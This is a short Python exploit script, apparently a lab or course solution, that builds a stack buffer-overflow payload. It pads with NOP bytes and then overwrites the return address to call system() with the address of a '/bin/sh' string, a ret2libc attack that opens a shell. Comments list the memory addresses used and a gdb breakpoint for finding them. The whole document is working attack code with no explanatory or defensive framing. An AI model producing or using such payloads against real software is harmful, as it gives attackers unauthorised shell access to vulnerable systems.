from shellcode import shellcode
from struct import pack 
import sys

def main():
    for i in range(22):
        sys.stdout.buffer.write(b"\x90")
    sys.stdout.buffer.write(pack("<I",0x080518d0))
    sys.stdout.buffer.write(pack("<I",0xfffef9a0))
    sys.stdout.buffer.write(pack("<I",0x080b6871))
   
if __name__ == "__main__":
    main()

#address of "bin/sh" is found at 0x080b6871
#address of system 0x080518d0
#start of buffer address 0xfffef990
#address of return adress 0xfffef9ac


#gdb
#break *0x08049d4d
